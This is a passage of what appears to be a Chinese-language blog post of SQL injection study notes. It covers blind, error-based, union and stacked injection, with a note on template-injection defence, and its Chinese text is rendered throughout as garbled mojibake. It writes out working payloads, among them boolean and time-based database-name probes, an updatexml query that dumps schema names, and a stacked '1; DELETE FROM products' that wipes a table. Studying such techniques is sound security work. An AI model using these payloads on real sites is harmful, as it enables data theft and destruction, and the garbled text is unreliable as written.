‡ç¼–è¯‘æ¸²æŸ“</strong></u>çš„è¿‡ç¨‹ä¸­ï¼Œ<u><strong>è¿›è¡Œäº†è¯­å¥çš„æ‹¼æ¥ï¼Œæ‰§è¡Œäº†æ‰€æ’å…¥çš„æ¶æ„å†…å®¹</strong></u>ï¼Œä»è€Œ<u><strong>å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShellç­‰</strong></u>é—®é¢˜</p><h3 id="3-é˜²å¾¡-12"><a href="#3-é˜²å¾¡-12" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>1ï¼‰å’Œå…¶ä»–çš„æ³¨å…¥é˜²å¾¡ä¸€æ ·ï¼Œ<u><strong>ç»å¯¹ä¸è¦è®©ç”¨æˆ·å¯¹ä¼ å…¥æ¨¡æ¿çš„å†…å®¹æˆ–è€…æ¨¡æ¿æœ¬èº«è¿›è¡Œæ§åˆ¶</strong></u></p><p>2ï¼‰<u><strong>å‡å°‘æˆ–è€…æ”¾å¼ƒç›´æ¥ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“åˆå­—ç¬¦ä¸²æ‹¼æ¥çš„æ¨¡æ¿æ¸²æŸ“</strong></u>æ–¹å¼ï¼Œ<u><strong>ä½¿ç”¨æ­£è§„çš„æ¨¡æ¿æ¸²æŸ“æ–¹æ³•</strong></u></p></blockquote><h1 id="æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆä¸€ï¼‰"><a href="#æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆä¸€ï¼‰" class="headerlink" title="æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆä¸€ï¼‰"></a>æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆä¸€ï¼‰</h1><blockquote><p>è¡¥å……ä¸€äº›çŸ¥è¯†ç‚¹</p></blockquote><hr><h2 id="ä¸€ã€sql"><a href="#ä¸€ã€sql" class="headerlink" title="ä¸€ã€sql"></a>ä¸€ã€sql</h2><h3 id="sqlæ³¨å…¥çš„åˆ†ç±»"><a href="#sqlæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="sqlæ³¨å…¥çš„åˆ†ç±»"></a>sqlæ³¨å…¥çš„åˆ†ç±»</h3><h4 id="â‘ æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š"><a href="#â‘ æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š" class="headerlink" title="â‘ æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š"></a>â‘ æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š</h4><p>â€ƒâ€ƒï¼ˆ1ï¼‰<code>GET</code> æ³¨å…¥ï¼šæäº¤æ•°æ®çš„æ–¹å¼æ˜¯ GET , æ³¨å…¥ç‚¹çš„ä½ç½®åœ¨ GET å‚æ•°éƒ¨åˆ†ã€‚æ¯”å¦‚æœ‰è¿™æ ·çš„ä¸€ä¸ªé“¾æ¥<code>http://xxx.com/news.php?id=1</code> , id æ˜¯æ³¨å…¥ç‚¹ã€‚</p><p>â€ƒâ€ƒï¼ˆ2ï¼‰<code>POST</code> æ³¨å…¥ï¼šä½¿ç”¨ POST æ–¹å¼æäº¤æ•°æ®ï¼Œæ³¨å…¥ç‚¹ä½ç½®åœ¨ POST æ•°æ®éƒ¨åˆ†ï¼Œå¸¸å‘ç”Ÿåœ¨è¡¨å•ä¸­(è¾“å…¥æ¡†)ã€‚</p><p>â€ƒâ€ƒï¼ˆ3ï¼‰<code>Cookie</code> æ³¨å…¥ï¼šHTTPè¯·æ±‚çš„æ—¶å€™ä¼šå¸¦ä¸Šå®¢æˆ·ç«¯çš„Cookie, æ³¨å…¥ç‚¹åœ¨Cookieå½“ä¸­çš„æŸä¸ªå­—æ®µä¸­ã€‚</p><p>â€ƒâ€ƒï¼ˆ4ï¼‰<code>HTTP</code> å¤´éƒ¨æ³¨å…¥ï¼šæ³¨å…¥ç‚¹åœ¨ HTTP è¯·æ±‚å¤´éƒ¨çš„æŸä¸ªå­—æ®µä¸­ã€‚æ¯”å¦‚å­˜åœ¨ User-Agent å­—æ®µä¸­ã€‚ä¸¥æ ¼è®²çš„è¯ï¼ŒCookie å…¶å®åº”è¯¥ä¹Ÿæ˜¯ç®—å¤´éƒ¨æ³¨å…¥çš„ä¸€ç§å½¢å¼ã€‚å› ä¸ºåœ¨ HTTP è¯·æ±‚çš„æ—¶å€™ï¼ŒCookie æ˜¯å¤´éƒ¨çš„ä¸€ä¸ªå­—æ®µã€‚</p><h4 id="â‘¡æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š"><a href="#â‘¡æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š" class="headerlink" title="â‘¡æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š"></a>â‘¡æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š</h4><h5 id="ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼š"><a href="#ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼š" class="headerlink" title="ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼š"></a>ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼š</h5><blockquote><p>boolç›²æ³¨ï¼Œå³å¯ä»¥æ ¹æ®è¿”å›é¡µé¢åˆ¤æ–­æ¡ä»¶çœŸå‡çš„æ³¨å…¥ã€‚</p><p>ä¸€èˆ¬æ ¹æ®æ•°æ®å­—ç¬¦asiicç å¤§å°æˆ–å­—ç¬¦é•¿çŸ­ï¼Œç”¨äºŒåˆ†æ³•è¿›è¡Œåˆ¤æ–­å­—ç¬¦ç­”æ¡ˆ</p><p>é•¿åº¦æ¯”å¦‚</p></blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> length(database()) &gt; <span class="number">5</span></span><br></pre></td></tr></table></figure><blockquote><p>æ„æ€å°±æ˜¯åˆ¤æ–­æ•°æ®åº“åå¤§äº5ï¼Œå¦‚æœè¿”å›å‡å°±åœ¨å°äº5é‡Œæ‰¾ï¼Œå¦‚æœè¿”å›çœŸï¼Œå°±åœ¨å¤§äº5èŒƒå›´é‡Œæ‰¾ï¼ŒçŒœæµ‹åˆ°å¤§æ¦‚çš„é•¿åº¦çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨&#x3D;è¯•è¯•</p></blockquote><blockquote><p>å¯¹äºå•ä¸€å­—ç¬¦çŒœæµ‹ï¼Œå¯ä»¥åˆ©ç”¨å­—æ¯çš„<code>ascii</code>ç ï¼Œ</p></blockquote><p>æ¯”å¦‚</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br></pre></td></tr></table></figure><blockquote><p>substræ˜¯æˆªå–å­—ç¬¦ï¼Œå¦‚ä¸Šå°±æ˜¯ä»ç¬¬ä¸€ä¸ªå­—ç¬¦æˆªå–ï¼Œæˆªå–ä¸€ä¸ªå­—ç¬¦<br>æ„æ€å°±æ˜¯åˆ¤æ–­æ•°æ®åº“åç¬¬ä¸€ä¸ªå­—æ¯çš„asciiç æ˜¯å¦å¤§äº110ï¼Œè¿”å›å‡å°±åœ¨å°äº110é‡Œæ‰¾ï¼Œè¿”å›çœŸï¼Œå°±åœ¨å¤§äº110é‡Œæ‰¾ï¼Œæœ€åå¯ä»¥ç”¨&#x3D;åŠ ä»¥ç¡®å®š</p></blockquote><p><code>å¯ä»¥ç”¨burpsuiteè¿›è¡Œpayloadçˆ†ç ´ï¼Œç”¨æ•°å­—å­—å…¸ï¼Œç›´æ¥ä»0-127ï¼ˆasciiç å…±127ä½ï¼‰ï¼Œç„¶åæ ¹æ®å›æ˜¾ï¼Œåˆ¤æ–­ï¼Œå°±ä¸ç”¨ä¸€ä¸ªä¸€ä¸ªæ…¢æ…¢å°è¯•</code></p><p><code>å¼ºçƒˆå»ºè®®å¯ä»¥å­¦ä¹ ä¸€ä¸‹pythonï¼Œè¿™æ ·å¯ä»¥è‡ªå·±é’ˆå¯¹æ€§çš„å†™ä¸€ä¸ªè„šæœ¬ï¼Œæ•ˆç‡æ›´é«˜</code></p><h5 id="ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼š"><a href="#ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼š" class="headerlink" title="ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼š"></a>ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼š</h5><blockquote><p>å³ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥ï¼ˆifï¼‰æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥ï¼ˆsleep()ï¼‰æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ã€‚</p></blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="keyword">if</span>(length(database()&gt;<span class="number">7</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œåˆ¤æ–­å¦‚æœæ•°æ®åº“åå¤§äº7ï¼Œå°±å»¶è¿Ÿç½‘é¡µ5sï¼Œåæ­£æ²¡æœ‰å»¶è¿Ÿã€å°±æ˜¯æ‰§è¡Œ1ã€‘ï¼Œå‰©ä¸‹çš„å’Œboolç›²æ³¨ä¸€æ ·ï¼ŒæŒ¨ä¸ªè¯•è¯•ï¼Œæ¨æµ‹å‡ºæ•°æ®åº“åå’Œå…¶ä»–æ•°æ®</p></blockquote><h5 id="ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥ï¼š"><a href="#ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥ï¼š"></a>ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥ï¼š</h5><blockquote><p>å³é¡µé¢ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œæˆ–è€…æŠŠæ³¨å…¥çš„è¯­å¥çš„ç»“æœç›´æ¥è¿”å›åœ¨é¡µé¢ä¸­ã€‚å¦‚ï¼šå•å¼•å·ã€åŒå¼•å·ã€åŸºäºæ•°å­—å‹æ³¨å…¥ã€‚</p></blockquote><p>æ¯”å¦‚ï¼ŒæŸ¥è¯¢æ•°æ®åº“å</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">schema_name</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>â€ƒ*<strong>æ³¨æ„</strong></p><blockquote><p>extractvalueå’Œupdatexmlåªæ˜¾ç¤º<code>32</code>ä½å­—ç¬¦</p><p>æ‰€ä»¥çˆ†å‡ºå­—ç¬¦ä¸å…¨æ—¶ï¼Œå¯ä»¥ç”¨<code>left(xxx,length)</code>å’Œ<code>right(xxx,length)</code><br>ã€æ³¨æ„0x7eä¹Ÿå°±æ˜¯<del>ä¹Ÿç®—å­—ç¬¦ä½ï¼ŒæŒ‰ä¸Šé¢ä¾‹å­ç”¨äº†ä¸¤ä¸ª</del>ï¼Œæ‰€ä»¥è¿™é‡Œæœ€å¤šåªèƒ½select 30ä¸ªå­—ç¬¦äº†ï¼Œä½†å·¦å³éƒ½30ï¼Œä¸€å…±å¯ä»¥select 60ä¸ªå­—ç¬¦ã€‘</p><p>æˆ–è€…ç”¨<code>substr(xxx,begin,length)</code>ï¼Œä»æ•°æ®çš„æŸä¸ªå¼€å§‹ã€è¿™é‡Œçš„å¼€å§‹ä½æ˜¯ä»1å¼€å§‹ï¼Œè€Œä¸æ˜¯0ã€‘æˆªå–ä¸€éƒ¨åˆ†æ˜¾ç¤º</p></blockquote><h5 id="ï¼ˆ4ï¼‰è”åˆæŸ¥è¯¢æ³¨å…¥ï¼šå¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ã€‚"><a href="#ï¼ˆ4ï¼‰è”åˆæŸ¥è¯¢æ³¨å…¥ï¼šå¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ã€‚" class="headerlink" title="ï¼ˆ4ï¼‰è”åˆæŸ¥è¯¢æ³¨å…¥ï¼šå¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ã€‚"></a>ï¼ˆ4ï¼‰è”åˆæŸ¥è¯¢æ³¨å…¥ï¼šå¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ã€‚</h5><h5 id="ï¼ˆ5ï¼‰å †æŸ¥è¯¢æ³¨å…¥ï¼ˆå †å æ³¨å…¥ï¼‰ï¼šå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥ã€‚"><a href="#ï¼ˆ5ï¼‰å †æŸ¥è¯¢æ³¨å…¥ï¼ˆå †å æ³¨å…¥ï¼‰ï¼šå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥ã€‚" class="headerlink" title="ï¼ˆ5ï¼‰å †æŸ¥è¯¢æ³¨å…¥ï¼ˆå †å æ³¨å…¥ï¼‰ï¼šå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥ã€‚"></a>ï¼ˆ5ï¼‰å †æŸ¥è¯¢æ³¨å…¥ï¼ˆå †å æ³¨å…¥ï¼‰ï¼šå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥ã€‚</h5><h5 id="ï¼ˆ6ï¼‰å®½å­—èŠ‚æ³¨å…¥ï¼šæš‚æ—¶æœªå­¦"><a href="#ï¼ˆ6ï¼‰å®½å­—èŠ‚æ³¨å…¥ï¼šæš‚æ—¶æœªå­¦" class="headerlink" title="ï¼ˆ6ï¼‰å®½å­—èŠ‚æ³¨å…¥ï¼šæš‚æ—¶æœªå­¦"></a>ï¼ˆ6ï¼‰å®½å­—èŠ‚æ³¨å…¥ï¼šæš‚æ—¶æœªå­¦</h5><h4 id="â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š"><a href="#â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š" class="headerlink" title="â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š"></a>â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š</h4><p>â€ƒâ€ƒï¼ˆ1ï¼‰æ•°å­—å‹æ³¨å…¥ç‚¹ï¼šè®¸å¤šç½‘é¡µé“¾æ¥æœ‰ç±»ä¼¼çš„ç»“æ„ <code>http://xxx.com/users.php?id=1</code> åŸºäºæ­¤ç§å½¢å¼çš„æ³¨å…¥ï¼Œå…¶æ³¨å…¥ç‚¹ id ç±»å‹ä¸ºæ•°å­—è‹¥å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œåˆ™å¯ä»¥åˆ©ç”¨ç½‘é¡µé€šè¿‡æ­¤ç§ç»“æ„ä¼ é€’idç­‰ä¿¡æ¯çš„åŸç†ï¼Œæ„é€ å‡ºç±»ä¼¼å¦‚ä¸‹çš„sqlæ³¨å…¥è¯­å¥è¿›è¡Œçˆ†ç ´ï¼šselect * from è¡¨å where id&#x3D;1 and 1&#x3D;1</p><p>â€ƒâ€ƒï¼ˆ2ï¼‰å­—ç¬¦å‹æ³¨å…¥ç‚¹ï¼šç½‘é¡µé“¾æ¥æœ‰ç±»ä¼¼çš„ç»“æ„ <code>http://xxx.com/users.php?name=admin</code> è¿™ç§å½¢å¼ï¼Œå…¶æ³¨å…¥ç‚¹ name ç±»å‹ä¸ºå­—ç¬¦ç±»å‹ï¼Œè‹¥å­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºç±»ä¼¼ä¸å¦‚ä¸‹çš„sqlæ³¨å…¥è¯­å¥è¿›è¡Œçˆ†ç ´ï¼šselect * from è¡¨å where name&#x3D;â€˜adminâ€™ and 1&#x3D;1 â€™</p><p>â€ƒâ€ƒï¼ˆ3ï¼‰æœç´¢å‹æ³¨å…¥ç‚¹ï¼šè¿™æ˜¯ä¸€ç±»ç‰¹æ®Šçš„æ³¨å…¥ç±»å‹ã€‚è¿™ç±»æ³¨å…¥ä¸»è¦æ˜¯æŒ‡åœ¨è¿›è¡Œæ•°æ®æœç´¢æ—¶æ²¡è¿‡æ»¤æœç´¢å‚æ•°ï¼Œä¸€èˆ¬åœ¨é“¾æ¥åœ°å€ä¸­æœ‰ â€œkeyword&#x3D;å…³é”®å­—â€ æœ‰çš„ä¸æ˜¾ç¤ºåœ¨çš„é“¾æ¥åœ°å€é‡Œé¢ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡æœç´¢æ¡†è¡¨å•æäº¤ã€‚æ­¤ç±»æ³¨å…¥ç‚¹æäº¤çš„ SQL è¯­å¥ï¼Œå…¶åŸå½¢å¤§è‡´ä¸ºï¼šselect * from è¡¨å where å­—æ®µ like â€˜%å…³é”®å­—%â€™ è‹¥å­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºç±»ä¼¼ä¸å¦‚ä¸‹çš„sqlæ³¨å…¥è¯­å¥è¿›è¡Œçˆ†ç ´ï¼šselect * from è¡¨å where å­—æ®µ like â€˜%æµ‹è¯•%â€™ and â€˜%1%â€™&#x3D;â€™%1%â€™</p><h4 id="â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥-å“ªé‡Œå‘ç”Ÿäº†å½±å“"><a href="#â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥-å“ªé‡Œå‘ç”Ÿäº†å½±å“" class="headerlink" title="â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥(å“ªé‡Œå‘ç”Ÿäº†å½±å“)"></a>â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥(å“ªé‡Œå‘ç”Ÿäº†å½±å“)</h4><p><code>â˜…ä¸€é˜¶æ³¨å°„</code> </p><p><code>â˜…äºŒé˜¶æ³¨å°„</code> </p><blockquote><p>ä¸€é˜¶æ³¨å°„æ˜¯æŒ‡è¾“å…¥çš„æ³¨å°„è¯­å¥å¯¹ WEB ç›´æ¥äº§ç”Ÿäº†å½±å“ï¼Œå‡ºç°äº†ç»“æœï¼›</p><p>äºŒé˜¶æ³¨å…¥ç±»ä¼¼å­˜å‚¨å‹ XSSï¼Œæ˜¯æŒ‡è¾“å…¥æäº¤çš„è¯­å¥ï¼Œæ— æ³•ç›´æ¥å¯¹ WEB åº”ç”¨ç¨‹åºäº§ç”Ÿå½±å“ï¼Œé€šè¿‡å…¶å®ƒçš„è¾…åŠ©é—´æ¥çš„å¯¹ WEB äº§ç”Ÿå±å®³ï¼Œè¿™æ ·çš„å°±è¢«ç§°ä¸ºæ˜¯äºŒé˜¶æ³¨å…¥. </p></blockquote><h4 id="1-å †å æ³¨å…¥"><a href="#1-å †å æ³¨å…¥" class="headerlink" title="1.å †å æ³¨å…¥"></a>1.å †å æ³¨å…¥</h4><h5 id="1-å †å æ³¨å…¥å®šä¹‰"><a href="#1-å †å æ³¨å…¥å®šä¹‰" class="headerlink" title="1.å †å æ³¨å…¥å®šä¹‰"></a>1.å †å æ³¨å…¥å®šä¹‰</h5><blockquote><p>   Stacked  injections(å †å æ³¨å…¥)ä»åè¯çš„å«ä¹‰å°±å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯ä¸€å † sql è¯­å¥(å¤šæ¡)ä¸€èµ·æ‰§è¡Œã€‚è€Œåœ¨çœŸå®çš„è¿ç”¨ä¸­ä¹Ÿæ˜¯è¿™æ ·çš„, æˆ‘ä»¬çŸ¥é“åœ¨  mysql ä¸­, ä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­, æ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ ; è¡¨ç¤ºè¯­å¥ç»“æŸã€‚è¿™æ ·æˆ‘ä»¬å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥å¤šå¥ä¸€èµ·ä½¿ç”¨ã€‚è¿™ä¸ªå«åš stacked  injectionã€‚</p></blockquote><h5 id="2-å †å æ³¨å…¥åŸç†"><a href="#2-å †å æ³¨å…¥åŸç†" class="headerlink" title="2.å †å æ³¨å…¥åŸç†"></a>2.å †å æ³¨å…¥åŸç†</h5><p>   åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚<u>è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥</u>ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äº<u>union æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥</u>ï¼Œè€Œ<u>å †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥</u>ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š<code>1; DELETE FROM products</code>æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š  <code>Select * from products where productid=1;DELETE FROM products</code>å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œ<u><strong>ç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯</strong></u>ï¼Œ<u><strong>ç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤</strong></u>ã€‚</p><h5 id="3-å †å æ³¨å…¥çš„å±€é™æ€§"><a href="#3-å †å æ³¨å…¥çš„å±€é™æ€§" class="headerlink" title="3.å †å æ³¨å…¥çš„å±€é™æ€§"></a>3.å †å æ³¨å…¥çš„å±€é™æ€§</h5><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p><p><strong>ä¸‹é¢æˆ‘ä»¥ä¸€é“é¢˜ä¸ºä¾‹è§£æå †å æ³¨å…¥ï¼Œè¯¥é¢˜æ¥è‡ªäº<a href="../../../../2022/06/21/buuctf-wp"> buuctfçš„[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ </a></strong></p><h4 id="2-æ— åˆ—åæ³¨å…¥"><a href="#2-æ— åˆ—åæ³¨å…¥" class="headerlink" title="2.æ— åˆ—åæ³¨å…¥"></a>2.<a href="https://www.cnblogs.com/Lee-404/p/12833788.html">æ— åˆ—åæ³¨å…¥</a></h4><p>ä¸Šé¢é“¾æ¥æ˜¯ä¸€ç¯‡å¤§ä½¬è®²è§£çš„æ— åˆ—åæ³¨å…¥ï¼Œä¹‹å‰åˆ·æ”»é˜²ä¸–ç•Œé‡åˆ°ç±»ä¼¼çš„é¢˜ç›®ï¼Œçœ‹äº†è¿™ç¯‡æ–‡ç« å­¦åˆ°äº†æ–°æŠ€å·§</p><h4 id="3-è”åˆæ³¨å…¥"><a href="#3-è”åˆæ³¨å…¥" class="headerlink" title="*3.è”åˆæ³¨å…¥"></a>*3.è”åˆæ³¨å…¥</h4><p><strong>è”åˆæ³¨å…¥æœ‰ä¸ªæŠ€å·§ã€‚åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ª è™šæ‹Ÿçš„æ•°æ®</strong></p><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>æœ€åˆusersè¡¨ä¸­åªæœ‰ä¸€è¡Œæ•°æ®ï¼Œ</p><p><img src="/2022/05/28/Web-study/image-20220909230928678.png" alt="image-20220909230928678"></p><p><strong>æˆ‘ä»¬é€šè¿‡<code>union select</code>æŸ¥è¯¢å°±å¯ä»¥æ„é€ ä¸€è¡Œè™šæ‹Ÿçš„æ•°æ®ï¼Œ</strong></p><p><img src="/2022/05/28/Web-study/image-20220909231009396.png" alt="image-20220909231009396"></p><p>è¿™æ ·ï¼Œæˆ‘ä»¬åœ¨usersè¡¨ä¸­åˆ©ç”¨è”åˆæŸ¥è¯¢åˆ›å»ºäº†ä¸€è¡Œè™šæ‹Ÿçš„æ•°æ®ã€‚</p><hr><h4 id="1-å‡ ä¸ªå¸¸ç”¨å‡½æ•°"><a href="#1-å‡ ä¸ªå¸¸ç”¨å‡½æ•°" class="headerlink" title="1.å‡ ä¸ªå¸¸ç”¨å‡½æ•°"></a>1.å‡ ä¸ªå¸¸ç”¨å‡½æ•°</h4><blockquote><p>1.<code>version()</code>â€”â€”MySQL ç‰ˆæœ¬ </p><p>2.<code>user()</code>â€”â€”æ•°æ®åº“ç”¨æˆ·å </p><p>3.<code>database()</code>â€”â€”æ•°æ®åº“å </p><p>4.<code>@@datadir</code>â€”â€”æ•°æ®åº“è·¯å¾„ </p><p>5.<code>@@version_compile_os</code>â€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬</p></blockquote><h4 id="2-ä¸€èˆ¬ç”¨äºå°è¯•çš„é—­åˆè¯­å¥"><a href="#2-ä¸€èˆ¬ç”¨äºå°è¯•çš„é—­åˆè¯­å¥" class="headerlink" title="2.ä¸€èˆ¬ç”¨äºå°è¯•çš„é—­åˆè¯­å¥"></a>2.ä¸€èˆ¬ç”¨äºå°è¯•çš„<u>é—­åˆè¯­å¥</u></h4><p>Ps:&#96;&#96;â€“+å¯ä»¥ç”¨#æ›¿æ¢ï¼Œurl æäº¤è¿‡ç¨‹ä¸­ Url ç¼–ç åçš„#ä¸º%23ï¼Œâ€“å’Œ#ä¸ºæ³¨é‡Šç¬¦ï¼ŒæŠŠåé¢è¯­å¥æ³¨é‡Šæ‰ï¼Œä½¿å…¶æ— æ³•æ‰§è¡Œ&#96;</p><blockquote><p>æœ‰æ—¶ç”¨â€“+ï¼Œè€Œä¸ç”¨#çš„åŸå› æ˜¯ï¼Œhttpæ— æ³•è§£é‡Š#ï¼Œæ‰€ä»¥ç”¨â€“+æ¥ä»£æ›¿ï¼Œ<br>â€“+ä¸­èµ·åˆ°æ³¨é‡Šä½œç”¨å…¶å®æ˜¯â€“ï¼Œä½†æ˜¯å¦‚æœå•çº¯çš„â€“ä¼šå’Œåé¢çš„å†…å®¹è¿ä¸Šä»è€Œå¯¼è‡´sqlè¯­å¥å‡ºé”™ï¼Œæ‰€ä»¥æœ‰äº†+ä¼šè§£é‡Šä¸ºç©ºæ 